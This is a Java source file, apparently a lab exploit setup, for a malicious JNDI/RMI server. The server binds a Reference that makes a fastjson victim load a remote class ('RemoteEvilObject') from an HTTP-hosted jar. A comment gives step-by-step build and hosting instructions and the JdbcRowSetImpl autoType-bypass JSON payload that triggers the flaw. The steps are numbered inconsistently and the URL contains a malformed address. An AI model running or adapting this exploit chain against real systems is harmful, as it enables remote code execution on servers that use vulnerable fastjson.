import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JndiServer {

    /**
     * 1. javac RemoteEvilObject.java && jar cvf  remote.jar  RemoteEvilObject.class
     * 2. python -m SimpleHTTPServer 8086
     * 4. jar cvf  remote.jar    RemoteEvilObject.class
     * 3. 运行 main
     * 4. 使用fastjson的poc
     * {
     * "aaa": {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
     * "bbb": {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/anything","autoCommit":true}
     * }
     * 即可触发漏洞
     */
    public static void main(String[] args) throws Exception {
        System.out.println("创建RMI注册表");
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new javax.naming.Reference("RemoteEvilObject", "RemoteEvilObject", "http://127.0.01:8086/remote.jar");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
        registry.bind("anything", referenceWrapper);
    }
}
